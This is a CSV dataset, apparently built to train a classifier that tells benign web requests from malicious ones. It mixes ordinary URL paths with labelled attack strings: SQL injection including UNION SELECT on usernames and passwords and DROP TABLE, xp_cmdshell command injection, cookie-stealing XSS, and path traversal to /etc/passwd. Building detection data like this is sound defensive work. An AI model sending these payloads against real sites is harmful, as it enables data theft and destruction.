payload,label,length,special_chars,keywords
/login?category=tech93,0,22,0,0
/checkout?category=tech631,0,26,0,0
/login?page=2661,0,16,0,0
/products/item?user=urmit81,0,27,0,0
/dashboard?sort=asc731,0,22,0,0
/about,0,6,0,0
/about?user=urmit557,0,20,0,0
/login,0,6,0,0
"/about?search=UNION SELECT username, password FROM users",1,56,0,2
/checkout,0,9,0,0
/<script>alert(document.cookie)</script>,1,40,6,3
/contact?sort=asc74,0,19,0,0
/index.html?page=2701,0,21,0,0
/index.html?user=urmit170,0,25,0,0
/dashboard?id=179,0,17,0,0
/checkout?id=1990,0,17,0,0
/dashboard?sort=asc200,0,22,0,0
/onload=prompt(1),1,17,2,0
/checkout?user=urmit631,0,23,0,0
/dashboard,0,10,0,0
/api/users?page=2280,0,20,0,0
/about,0,6,0,0
/dashboard?category=tech8,0,25,0,0
/index.html?sort=asc773,0,23,0,0
/dashboard?search=../../../../etc/passwd,1,40,0,0
/index.html?category=tech315,0,28,0,0
/contact?page=2336,0,18,0,0
/api/users,0,10,0,0
/login?sort=asc10,0,17,0,0
/about?sort=asc263,0,18,0,0
"/about?search="" OR 1=1 --",1,25,1,0
/api/users?sort=asc688,0,22,0,0
/api/users?id=1857,0,18,0,0
/checkout?sort=asc344,0,21,0,0
/login?category=tech734,0,23,0,0
/about?page=2607,0,16,0,0
/products/item?page=251,0,23,0,0
/api/users?category=tech766,0,27,0,0
/dashboard?search=' OR '1'='1,1,29,4,0
/checkout?user=urmit927,0,23,0,0
/about?category=tech761,0,23,0,0
/checkout?sort=asc95,0,20,0,0
/api/users?id=1866,0,18,0,0
/api/users?sort=asc64,0,21,0,0
/login?user=urmit644,0,20,0,0
/products/item?category=tech730,0,31,0,0
/about?page=2490,0,16,0,0
/checkout?id=1731,0,17,0,0
/checkout,0,9,0,0
/products/item,0,14,0,0
/checkout,0,9,0,0
/contact?category=tech586,0,25,0,0
/products/item?id=128,0,21,0,0
/api/users?user=urmit255,0,24,0,0
/contact?sort=asc586,0,20,0,0
/checkout,0,9,0,0
/contact?search=' OR '1'='1,1,27,4,0
/products/item?sort=asc127,0,26,0,0
/checkout?category=tech770,0,26,0,0
/index.html?category=tech435,0,28,0,0
/about?sort=asc328,0,18,0,0
/index.html,0,11,0,0
/contact,0,8,0,0
/checkout?category=tech454,0,26,0,0
/login?sort=asc441,0,18,0,0
/checkout?sort=asc679,0,21,0,0
/contact?sort=asc333,0,20,0,0
/about?id=1208,0,14,0,0
/dashboard?sort=asc734,0,22,0,0
/checkout?user=urmit527,0,23,0,0
/admin' --,1,10,1,0
/contact?page=2900,0,18,0,0
"/"" OR 1=1 --",1,12,1,0
/dashboard?page=2101,0,20,0,0
/dashboard?category=tech648,0,27,0,0
/products/item?search=<script>alert(document.cookie)</script>,1,61,6,3
"/about?search=UNION SELECT username, password FROM users",1,56,0,2
/contact?id=1736,0,16,0,0
/checkout?sort=asc840,0,21,0,0
/index.html?id=1869,0,19,0,0
/contact?page=2780,0,18,0,0
/api/users?sort=asc634,0,22,0,0
/login?user=urmit286,0,20,0,0
/about?page=2943,0,16,0,0
/contact?page=2177,0,18,0,0
/about?id=1855,0,14,0,0
/api/users?user=urmit393,0,24,0,0
/onload=prompt(1),1,17,2,0
/contact,0,8,0,0
"/index.html?search="" OR 1=1 --",1,30,1,0
/about?category=tech99,0,22,0,0
/?id=1; DROP TABLE users,1,24,1,1
/api/users?category=tech584,0,27,0,0
/dashboard?page=259,0,19,0,0
/index.html?category=tech132,0,28,0,0
/dashboard?search=?id=1; DROP TABLE users,1,41,1,1
/login?search=admin' --,1,23,1,0
/contact?user=urmit824,0,22,0,0
/login,0,6,0,0
/about?category=tech471,0,23,0,0
/dashboard?id=1988,0,18,0,0
/checkout?sort=asc631,0,21,0,0
/index.html,0,11,0,0
/about?sort=asc983,0,18,0,0
/dashboard?page=2879,0,20,0,0
/products/item?user=urmit168,0,28,0,0
/dashboard?user=urmit252,0,24,0,0
/about?sort=asc553,0,18,0,0
/contact?category=tech301,0,25,0,0
/index.html?page=2586,0,21,0,0
/checkout?user=urmit438,0,23,0,0
/about?user=urmit99,0,19,0,0
/contact?user=urmit29,0,21,0,0
/products/item?id=1540,0,22,0,0
/products/item?sort=asc483,0,26,0,0
/about?user=urmit896,0,20,0,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1,40,9,3
/index.html?category=tech527,0,28,0,0
/api/users?page=2452,0,20,0,0
/dashboard?sort=asc750,0,22,0,0
/onload=prompt(1),1,17,2,0
/about,0,6,0,0
/api/users?sort=asc785,0,22,0,0
/index.html?sort=asc671,0,23,0,0
/login?category=tech621,0,23,0,0
/index.html?category=tech685,0,28,0,0
/login,0,6,0,0
/dashboard?page=2950,0,20,0,0
/products/item?user=urmit435,0,28,0,0
/api/users?category=tech607,0,27,0,0
/login?user=urmit598,0,20,0,0
/checkout,0,9,0,0
/dashboard?user=urmit661,0,24,0,0
"/UNION SELECT username, password FROM users",1,43,0,2
/api/users?sort=asc966,0,22,0,0
/onload=prompt(1),1,17,2,0
"/UNION SELECT username, password FROM users",1,43,0,2
/dashboard?user=urmit679,0,24,0,0
/about,0,6,0,0
/login?page=2892,0,16,0,0
/api/users?page=2381,0,20,0,0
/products/item?page=2914,0,24,0,0
/dashboard?category=tech466,0,27,0,0
/dashboard?sort=asc502,0,22,0,0
/products/item?page=2865,0,24,0,0
/javascript:eval('var a=1'),1,27,4,1
/about?category=tech419,0,23,0,0
"/index.html?search=UNION SELECT username, password FROM users",1,61,0,2
/index.html?user=urmit352,0,25,0,0
/contact?category=tech576,0,25,0,0
/admin' --,1,10,1,0
/?id=1; DROP TABLE users,1,24,1,1
/contact?sort=asc169,0,20,0,0
/contact?id=1730,0,16,0,0
/about?user=urmit543,0,20,0,0
/contact?sort=asc592,0,20,0,0
/checkout?category=tech264,0,26,0,0
/about?id=1981,0,14,0,0
/dashboard?page=2994,0,20,0,0
"/contact?search=UNION SELECT username, password FROM users",1,58,0,2
/index.html?sort=asc178,0,23,0,0
/checkout,0,9,0,0
/products/item?category=tech905,0,31,0,0
/products/item?user=urmit296,0,28,0,0
/products/item?category=tech437,0,31,0,0
/api/users?sort=asc744,0,22,0,0
/api/users?user=urmit377,0,24,0,0
/dashboard?page=2184,0,20,0,0
/products/item,0,14,0,0
/dashboard?id=1542,0,18,0,0
/products/item?id=1541,0,22,0,0
/login?category=tech962,0,23,0,0
/contact?id=1113,0,16,0,0
/dashboard?id=1402,0,18,0,0
/checkout?page=2383,0,19,0,0
/dashboard,0,10,0,0
/contact?user=urmit165,0,22,0,0
/api/users?page=2618,0,20,0,0
/dashboard?id=1668,0,18,0,0
/admin' --,1,10,1,0
/about?category=tech163,0,23,0,0
/checkout,0,9,0,0
/checkout?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1,56,9,3
/dashboard?page=2911,0,20,0,0
/api/users?user=urmit259,0,24,0,0
/about?sort=asc237,0,18,0,0
/products/item?id=1612,0,22,0,0
/login,0,6,0,0
/dashboard?category=tech130,0,27,0,0
/about,0,6,0,0
/login?search=onload=prompt(1),1,30,2,0
/dashboard,0,10,0,0
/api/users?sort=asc671,0,22,0,0
/products/item?user=urmit408,0,28,0,0
/contact?category=tech965,0,25,0,0
/login?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1,53,9,3
/about?page=2295,0,16,0,0
/products/item?category=tech479,0,31,0,0
/about?id=1895,0,14,0,0
/api/users?user=urmit521,0,24,0,0
/products/item?category=tech76,0,30,0,0
/api/users?id=1221,0,18,0,0
/index.html?search=../../../windows/system32/cmd.exe,1,52,0,0
/login?sort=asc847,0,18,0,0
/contact,0,8,0,0
/about?search=' OR '1'='1,1,25,4,0
/about?category=tech887,0,23,0,0
/products/item,0,14,0,0
/checkout?id=1131,0,17,0,0
/contact?search='; EXEC xp_cmdshell('dir');--,1,45,7,1
/products/item?user=urmit711,0,28,0,0
/login?sort=asc793,0,18,0,0
/about?search=onload=prompt(1),1,30,2,0
/dashboard,0,10,0,0
/api/users?user=urmit411,0,24,0,0
/dashboard,0,10,0,0
/login,0,6,0,0
/api/users?id=1292,0,18,0,0
/contact?sort=asc363,0,20,0,0
/about?search=../../../windows/system32/cmd.exe,1,47,0,0
/login?page=2280,0,16,0,0
/api/users?id=1565,0,18,0,0
/dashboard?page=2887,0,20,0,0
/products/item?category=tech320,0,31,0,0
/onload=prompt(1),1,17,2,0
/about?page=2459,0,16,0,0
/checkout?id=1118,0,17,0,0
/login?user=urmit818,0,20,0,0
/about?id=1224,0,14,0,0
/index.html?sort=asc142,0,23,0,0
/login?page=225,0,15,0,0
/index.html?id=1914,0,19,0,0
/products/item,0,14,0,0
/products/item?sort=asc420,0,26,0,0
/contact,0,8,0,0
/index.html?sort=asc366,0,23,0,0
/api/users?category=tech545,0,27,0,0
/contact?search='; EXEC xp_cmdshell('dir');--,1,45,7,1
/contact?user=urmit479,0,22,0,0
/login?id=1478,0,14,0,0
/login?page=2892,0,16,0,0
/products/item?id=1992,0,22,0,0
/login?id=1629,0,14,0,0
/dashboard?category=tech873,0,27,0,0
/products/item?user=urmit671,0,28,0,0
/products/item?category=tech641,0,31,0,0
/about?search=?id=1; DROP TABLE users,1,37,1,1
/checkout,0,9,0,0
/products/item?category=tech769,0,31,0,0
/checkout?sort=asc769,0,21,0,0
/products/item?page=2313,0,24,0,0
/api/users,0,10,0,0
/checkout?sort=asc817,0,21,0,0
/login?search=admin' --,1,23,1,0
/products/item?sort=asc942,0,26,0,0
/api/users?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1,57,9,3
/checkout?id=1135,0,17,0,0
/index.html?page=2551,0,21,0,0
/index.html?sort=asc854,0,23,0,0
/dashboard,0,10,0,0
/about?category=tech467,0,23,0,0
/api/users?search=../../../../etc/passwd,1,40,0,0
/index.html?id=1156,0,19,0,0
/checkout?user=urmit499,0,23,0,0
/javascript:eval('var a=1'),1,27,4,1
/index.html?id=1460,0,19,0,0
/checkout?page=2701,0,19,0,0
/products/item?user=urmit109,0,28,0,0
/login?id=1481,0,14,0,0
/index.html?id=1968,0,19,0,0
/api/users?category=tech210,0,27,0,0
/products/item?sort=asc57,0,25,0,0
/index.html?user=urmit803,0,25,0,0
/login?category=tech79,0,22,0,0
/checkout?page=225,0,18,0,0
/' OR '1'='1,1,12,4,0
/contact,0,8,0,0
/api/users?user=urmit812,0,24,0,0
/index.html?page=2960,0,21,0,0
/about?id=1639,0,14,0,0
/products/item?category=tech144,0,31,0,0
/about?page=2132,0,16,0,0
/contact?user=urmit637,0,22,0,0
/index.html?page=2832,0,21,0,0
/dashboard?category=tech427,0,27,0,0
/index.html?page=2248,0,21,0,0
"/api/users?search="" OR 1=1 --",1,29,1,0
/onload=prompt(1),1,17,2,0
/login?sort=asc265,0,18,0,0
/login?sort=asc488,0,18,0,0
/index.html?sort=asc247,0,23,0,0
/contact?page=250,0,17,0,0
/dashboard?id=197,0,17,0,0
/checkout,0,9,0,0
/dashboard?page=2712,0,20,0,0
/api/users?id=1369,0,18,0,0
/../../../../etc/passwd,1,23,0,0
/products/item,0,14,0,0
/checkout?search=?id=1; DROP TABLE users,1,40,1,1
/about?user=urmit149,0,20,0,0
/contact?user=urmit210,0,22,0,0
/api/users?page=2373,0,20,0,0
/index.html?search='; EXEC xp_cmdshell('dir');--,1,48,7,1
/login?id=1326,0,14,0,0
/dashboard,0,10,0,0
/checkout,0,9,0,0
/products/item?category=tech52,0,30,0,0
/javascript:eval('var a=1'),1,27,4,1
/api/users?category=tech154,0,27,0,0
/contact?sort=asc92,0,19,0,0
/dashboard?category=tech346,0,27,0,0
/index.html?page=2443,0,21,0,0
/../../../windows/system32/cmd.exe,1,34,0,0
/contact?page=2761,0,18,0,0
/api/users?id=1789,0,18,0,0
/products/item,0,14,0,0
/about?page=2411,0,16,0,0
/' OR '1'='1,1,12,4,0
/dashboard?category=tech150,0,27,0,0
/checkout?search=javascript:eval('var a=1'),1,43,4,1
/about?page=2990,0,16,0,0
/contact?user=urmit365,0,22,0,0
/index.html?user=urmit178,0,25,0,0
/about?user=urmit571,0,20,0,0
/api/users?user=urmit488,0,24,0,0
/dashboard?page=2767,0,20,0,0
/products/item?user=urmit108,0,28,0,0
/index.html?search=../../../../etc/passwd,1,41,0,0
/'; EXEC xp_cmdshell('dir');--,1,30,7,1
/products/item?category=tech988,0,31,0,0
/'; EXEC xp_cmdshell('dir');--,1,30,7,1
/checkout,0,9,0,0
/contact?id=1114,0,16,0,0
/checkout?user=urmit44,0,22,0,0
/api/users?id=1453,0,18,0,0
/checkout?user=urmit138,0,23,0,0
/products/item?page=2537,0,24,0,0
/'; EXEC xp_cmdshell('dir');--,1,30,7,1
/checkout?id=123,0,16,0,0
/login,0,6,0,0
/api/users,0,10,0,0
/products/item?category=tech896,0,31,0,0
/about?category=tech46,0,22,0,0
/about?category=tech846,0,23,0,0
/login?page=2664,0,16,0,0
/?id=1; DROP TABLE users,1,24,1,1
/checkout?search='; EXEC xp_cmdshell('dir');--,1,46,7,1
/contact?id=1953,0,16,0,0
/login?user=urmit961,0,20,0,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1,40,9,3
/login?id=1979,0,14,0,0
/dashboard?page=2802,0,20,0,0
/dashboard,0,10,0,0
/api/users?page=289,0,19,0,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1,40,9,3
/api/users?user=urmit236,0,24,0,0
/products/item?search=../../../../etc/passwd,1,44,0,0
/products/item,0,14,0,0
/index.html?sort=asc165,0,23,0,0
/'; EXEC xp_cmdshell('dir');--,1,30,7,1
/api/users?category=tech912,0,27,0,0
/products/item?id=1847,0,22,0,0
/dashboard?sort=asc660,0,22,0,0
/checkout?id=1368,0,17,0,0
/products/item?id=1107,0,22,0,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1,40,9,3
/<script>alert(document.cookie)</script>,1,40,6,3
/login?user=urmit516,0,20,0,0
/../../../../etc/passwd,1,23,0,0
/api/users?search=onload=prompt(1),1,34,2,0
/products/item?user=urmit635,0,28,0,0
/index.html?search=../../../../etc/passwd,1,41,0,0
/api/users?user=urmit136,0,24,0,0
/products/item?id=1588,0,22,0,0
/checkout?category=tech46,0,25,0,0
/about,0,6,0,0
/index.html?page=2759,0,21,0,0
/login?page=2955,0,16,0,0
/products/item?category=tech245,0,31,0,0
/contact?user=urmit944,0,22,0,0
/products/item,0,14,0,0
/dashboard?page=2885,0,20,0,0
/api/users?user=urmit853,0,24,0,0
/checkout?id=1764,0,17,0,0
/contact?user=urmit863,0,22,0,0
/contact?id=1120,0,16,0,0
/products/item?id=1215,0,22,0,0
"/about?search="" OR 1=1 --",1,25,1,0
/login,0,6,0,0
/login?sort=asc295,0,18,0,0
/../../../windows/system32/cmd.exe,1,34,0,0
/checkout?category=tech288,0,26,0,0
/dashboard?sort=asc121,0,22,0,0
/api/users?sort=asc866,0,22,0,0
/login?sort=asc37,0,17,0,0
/dashboard?category=tech628,0,27,0,0
/contact?sort=asc414,0,20,0,0
/contact?category=tech507,0,25,0,0
/contact?search=../../../../etc/passwd,1,38,0,0
/index.html?user=urmit472,0,25,0,0
/login?page=2953,0,16,0,0
/index.html?page=2375,0,21,0,0
/checkout?page=2835,0,19,0,0
/products/item?category=tech612,0,31,0,0
/checkout?category=tech630,0,26,0,0
/about?page=2228,0,16,0,0
/contact,0,8,0,0
/login?user=urmit369,0,20,0,0
/dashboard,0,10,0,0
/checkout?user=urmit868,0,23,0,0
/contact?sort=asc824,0,20,0,0
/index.html?sort=asc257,0,23,0,0
/about?user=urmit326,0,20,0,0
/index.html?id=1981,0,19,0,0
/dashboard?search=?id=1; DROP TABLE users,1,41,1,1
/products/item?user=urmit863,0,28,0,0
/dashboard?category=tech58,0,26,0,0
/dashboard?id=1137,0,18,0,0
"/UNION SELECT username, password FROM users",1,43,0,2
/products/item?search=admin' --,1,31,1,0
/contact?sort=asc713,0,20,0,0
/contact?search=' OR '1'='1,1,27,4,0
/login,0,6,0,0
/' OR '1'='1,1,12,4,0
/contact?user=urmit469,0,22,0,0
/contact?category=tech729,0,25,0,0
/'; EXEC xp_cmdshell('dir');--,1,30,7,1
/dashboard?user=urmit782,0,24,0,0
/contact?sort=asc333,0,20,0,0
/contact?user=urmit618,0,22,0,0
/login?category=tech266,0,23,0,0
/contact?page=2375,0,18,0,0
/about?id=1637,0,14,0,0
/about?category=tech680,0,23,0,0
/contact?category=tech861,0,25,0,0
/dashboard,0,10,0,0
/products/item?page=2888,0,24,0,0
/index.html,0,11,0,0
/index.html?sort=asc848,0,23,0,0
/'; EXEC xp_cmdshell('dir');--,1,30,7,1
/api/users?category=tech280,0,27,0,0
/api/users,0,10,0,0
/api/users?id=1927,0,18,0,0
/?id=1; DROP TABLE users,1,24,1,1
/onload=prompt(1),1,17,2,0
/login,0,6,0,0
/javascript:eval('var a=1'),1,27,4,1
/contact?sort=asc15,0,19,0,0
/contact?sort=asc20,0,19,0,0
/contact?page=2485,0,18,0,0
/about?search=<script>alert(document.cookie)</script>,1,53,6,3
/contact?id=1435,0,16,0,0
/products/item?page=2791,0,24,0,0
/checkout?user=urmit739,0,23,0,0
/api/users,0,10,0,0
/checkout?category=tech868,0,26,0,0
/login?sort=asc744,0,18,0,0
/dashboard?category=tech901,0,27,0,0
/products/item?user=urmit395,0,28,0,0
/javascript:eval('var a=1'),1,27,4,1
/about?page=2964,0,16,0,0
/products/item?id=1834,0,22,0,0
/login?search=javascript:eval('var a=1'),1,40,4,1
/products/item?id=167,0,21,0,0
"/UNION SELECT username, password FROM users",1,43,0,2
/?id=1; DROP TABLE users,1,24,1,1
/checkout?id=1133,0,17,0,0
/?id=1; DROP TABLE users,1,24,1,1
/javascript:eval('var a=1'),1,27,4,1
/index.html?search=../../../windows/system32/cmd.exe,1,52,0,0
/login?user=urmit929,0,20,0,0
/'; EXEC xp_cmdshell('dir');--,1,30,7,1
/api/users?sort=asc78,0,21,0,0
/index.html?id=1142,0,19,0,0
/checkout?user=urmit132,0,23,0,0
/login?page=2730,0,16,0,0
/contact?user=urmit870,0,22,0,0
/about?sort=asc126,0,18,0,0
"/"" OR 1=1 --",1,12,1,0
/index.html?user=urmit595,0,25,0,0
/checkout?category=tech283,0,26,0,0
/checkout?page=2584,0,19,0,0
/../../../windows/system32/cmd.exe,1,34,0,0
/api/users?page=244,0,19,0,0
/products/item?sort=asc641,0,26,0,0
/contact?page=2386,0,18,0,0
/contact?user=urmit812,0,22,0,0
/index.html?sort=asc685,0,23,0,0
/api/users?category=tech853,0,27,0,0
/'; EXEC xp_cmdshell('dir');--,1,30,7,1
/' OR '1'='1,1,12,4,0
/contact?sort=asc261,0,20,0,0
/dashboard?user=urmit518,0,24,0,0
/api/users?id=1388,0,18,0,0
/about?user=urmit407,0,20,0,0
/index.html?sort=asc660,0,23,0,0
/contact?page=2437,0,18,0,0
/index.html?sort=asc899,0,23,0,0
/checkout?id=1672,0,17,0,0
/about?category=tech70,0,22,0,0
/contact?id=1481,0,16,0,0
/admin' --,1,10,1,0
/checkout,0,9,0,0
/index.html,0,11,0,0
/api/users?id=1897,0,18,0,0
/dashboard,0,10,0,0
/about?sort=asc289,0,18,0,0
/about?category=tech166,0,23,0,0
/api/users?search=onload=prompt(1),1,34,2,0
/contact?search=<script>alert(document.cookie)</script>,1,55,6,3
/products/item,0,14,0,0
/index.html,0,11,0,0
/about?page=220,0,15,0,0
/index.html?user=urmit689,0,25,0,0
/dashboard?id=1978,0,18,0,0
/?id=1; DROP TABLE users,1,24,1,1
/index.html?id=1287,0,19,0,0
/index.html?sort=asc57,0,22,0,0
/dashboard?category=tech926,0,27,0,0
/index.html?category=tech611,0,28,0,0
/checkout,0,9,0,0
/dashboard,0,10,0,0
/index.html?id=1759,0,19,0,0
/login?user=urmit988,0,20,0,0
/dashboard?id=1436,0,18,0,0
/contact?user=urmit849,0,22,0,0
/contact?user=urmit137,0,22,0,0
/products/item?sort=asc894,0,26,0,0
/javascript:eval('var a=1'),1,27,4,1
/about?page=244,0,15,0,0
"/index.html?search="" OR 1=1 --",1,30,1,0
/api/users?id=1309,0,18,0,0
/about?category=tech536,0,23,0,0
/login,0,6,0,0
/login,0,6,0,0
/dashboard?user=urmit291,0,24,0,0
/checkout,0,9,0,0
/index.html?search=admin' --,1,28,1,0
/login?category=tech892,0,23,0,0
/contact?sort=asc132,0,20,0,0
/javascript:eval('var a=1'),1,27,4,1
/dashboard?id=17,0,16,0,0
/products/item?user=urmit346,0,28,0,0
"/index.html?search="" OR 1=1 --",1,30,1,0
/about?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1,53,9,3
/contact?page=249,0,17,0,0
/checkout?user=urmit137,0,23,0,0
/checkout?sort=asc680,0,21,0,0
/index.html,0,11,0,0
/index.html?sort=asc846,0,23,0,0
/dashboard?id=1365,0,18,0,0
"/UNION SELECT username, password FROM users",1,43,0,2
/login?category=tech632,0,23,0,0
/admin' --,1,10,1,0
/<script>alert(document.cookie)</script>,1,40,6,3
/dashboard?user=urmit649,0,24,0,0
/contact?user=urmit134,0,22,0,0
/api/users?page=2859,0,20,0,0
/dashboard?category=tech602,0,27,0,0
/about?page=2775,0,16,0,0
/index.html?page=2529,0,21,0,0
/checkout?page=2249,0,19,0,0
/'; EXEC xp_cmdshell('dir');--,1,30,7,1
/api/users?sort=asc229,0,22,0,0
/checkout?id=1926,0,17,0,0
/javascript:eval('var a=1'),1,27,4,1
/index.html?page=2754,0,21,0,0
"/index.html?search=UNION SELECT username, password FROM users",1,61,0,2
/index.html?page=2790,0,21,0,0
/index.html,0,11,0,0
/contact?sort=asc460,0,20,0,0
/checkout?category=tech382,0,26,0,0
/products/item?sort=asc726,0,26,0,0
/checkout?id=1143,0,17,0,0
/dashboard?sort=asc250,0,22,0,0
/about?sort=asc52,0,17,0,0
/checkout?category=tech263,0,26,0,0
/login?sort=asc235,0,18,0,0
/products/item,0,14,0,0
/about?search=<script>alert(document.cookie)</script>,1,53,6,3
/index.html?user=urmit367,0,25,0,0
/about?page=233,0,15,0,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1,40,9,3
/onload=prompt(1),1,17,2,0
/api/users,0,10,0,0
/about?id=1686,0,14,0,0
/about?page=216,0,15,0,0
/index.html,0,11,0,0
/index.html?id=1819,0,19,0,0
/login?user=urmit457,0,20,0,0
/login?user=urmit100,0,20,0,0
/login,0,6,0,0
/index.html?category=tech802,0,28,0,0
/products/item,0,14,0,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1,40,9,3
/contact?id=1927,0,16,0,0
/about?user=urmit333,0,20,0,0
/login?user=urmit146,0,20,0,0
/checkout?user=urmit161,0,23,0,0
/products/item?search=../../../windows/system32/cmd.exe,1,55,0,0
/index.html?search=<script>alert(document.cookie)</script>,1,58,6,3
/products/item?sort=asc137,0,26,0,0
/login?user=urmit14,0,19,0,0
/checkout?page=2710,0,19,0,0
/login?category=tech898,0,23,0,0
/login?category=tech355,0,23,0,0
/about?id=1275,0,14,0,0
/dashboard?page=2290,0,20,0,0
/index.html?sort=asc381,0,23,0,0
/about,0,6,0,0
/checkout?search=' OR '1'='1,1,28,4,0
/checkout,0,9,0,0
/dashboard?sort=asc134,0,22,0,0
/api/users?sort=asc628,0,22,0,0
/products/item?user=urmit696,0,28,0,0
/login?sort=asc39,0,17,0,0
/dashboard?sort=asc438,0,22,0,0
/index.html,0,11,0,0
/products/item?user=urmit442,0,28,0,0
/checkout?page=2893,0,19,0,0
/api/users?user=urmit386,0,24,0,0
/dashboard,0,10,0,0
/checkout?id=1186,0,17,0,0
/dashboard?search='; EXEC xp_cmdshell('dir');--,1,47,7,1
/dashboard?page=2714,0,20,0,0
/about?user=urmit700,0,20,0,0
/login,0,6,0,0
/about?search=admin' --,1,23,1,0
/products/item?category=tech721,0,31,0,0
/products/item,0,14,0,0
/index.html?id=1808,0,19,0,0
/login?page=2209,0,16,0,0
/index.html?page=228,0,20,0,0
/contact?user=urmit670,0,22,0,0
/about?sort=asc409,0,18,0,0
/api/users?user=urmit476,0,24,0,0
/api/users?user=urmit715,0,24,0,0
/about?user=urmit59,0,19,0,0
/index.html?sort=asc477,0,23,0,0
/products/item?page=2768,0,24,0,0
/api/users?search=' OR '1'='1,1,29,4,0
/dashboard?category=tech846,0,27,0,0
/login,0,6,0,0
/contact?user=urmit588,0,22,0,0
/index.html?category=tech711,0,28,0,0
/contact?category=tech24,0,24,0,0
/api/users?page=2715,0,20,0,0
/<script>alert(document.cookie)</script>,1,40,6,3
/checkout?id=1603,0,17,0,0
/about,0,6,0,0
/javascript:eval('var a=1'),1,27,4,1
/about?search=admin' --,1,23,1,0
/../../../windows/system32/cmd.exe,1,34,0,0
/index.html?sort=asc665,0,23,0,0
/dashboard?sort=asc504,0,22,0,0
"/"" OR 1=1 --",1,12,1,0
/dashboard?sort=asc669,0,22,0,0
/dashboard?user=urmit838,0,24,0,0
/index.html?page=2498,0,21,0,0
/login?id=1691,0,14,0,0
/checkout,0,9,0,0
/index.html?page=2924,0,21,0,0
/login?sort=asc119,0,18,0,0
/products/item?category=tech261,0,31,0,0
/dashboard?page=2185,0,20,0,0
/contact?id=1462,0,16,0,0
/../../../windows/system32/cmd.exe,1,34,0,0
/dashboard,0,10,0,0
/products/item?page=2645,0,24,0,0
/index.html?search=../../../windows/system32/cmd.exe,1,52,0,0
/checkout?sort=asc925,0,21,0,0
/checkout?page=2996,0,19,0,0
/about?user=urmit561,0,20,0,0
/api/users,0,10,0,0
/about?user=urmit659,0,20,0,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1,40,9,3
/contact?sort=asc864,0,20,0,0
/login?category=tech907,0,23,0,0
/dashboard,0,10,0,0
/'; EXEC xp_cmdshell('dir');--,1,30,7,1
/about?sort=asc623,0,18,0,0
/login?page=2825,0,16,0,0
/about?sort=asc840,0,18,0,0
/checkout?sort=asc585,0,21,0,0
/dashboard?search=javascript:eval('var a=1'),1,44,4,1
/../../../windows/system32/cmd.exe,1,34,0,0
"/UNION SELECT username, password FROM users",1,43,0,2
/login?sort=asc101,0,18,0,0
/../../../windows/system32/cmd.exe,1,34,0,0
/admin' --,1,10,1,0
/dashboard?sort=asc433,0,22,0,0
/login?page=2991,0,16,0,0
/'; EXEC xp_cmdshell('dir');--,1,30,7,1
/about?sort=asc528,0,18,0,0
/checkout?user=urmit355,0,23,0,0
/checkout?id=1422,0,17,0,0
/dashboard?user=urmit750,0,24,0,0
/api/users?sort=asc63,0,21,0,0
/index.html?user=urmit607,0,25,0,0
/login?page=2478,0,16,0,0
/javascript:eval('var a=1'),1,27,4,1
/dashboard?search=<script>alert(document.cookie)</script>,1,57,6,3
/dashboard?user=urmit851,0,24,0,0
/contact?id=1567,0,16,0,0
/dashboard?page=2877,0,20,0,0
/index.html?id=1768,0,19,0,0
/' OR '1'='1,1,12,4,0
/api/users?sort=asc685,0,22,0,0
/dashboard?search=?id=1; DROP TABLE users,1,41,1,1
/products/item?sort=asc430,0,26,0,0
/index.html?page=2192,0,21,0,0
/api/users?page=2394,0,20,0,0
/index.html?page=241,0,20,0,0
/index.html?id=1610,0,19,0,0
/dashboard?search=onload=prompt(1),1,34,2,0
/checkout?search=../../../windows/system32/cmd.exe,1,50,0,0
/checkout?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1,56,9,3
/api/users?user=urmit426,0,24,0,0
/dashboard?sort=asc921,0,22,0,0
/contact?category=tech212,0,25,0,0
/api/users?category=tech433,0,27,0,0
/index.html,0,11,0,0
/about,0,6,0,0
/index.html?page=2154,0,21,0,0
/about?sort=asc654,0,18,0,0
/dashboard?search=../../../../etc/passwd,1,40,0,0
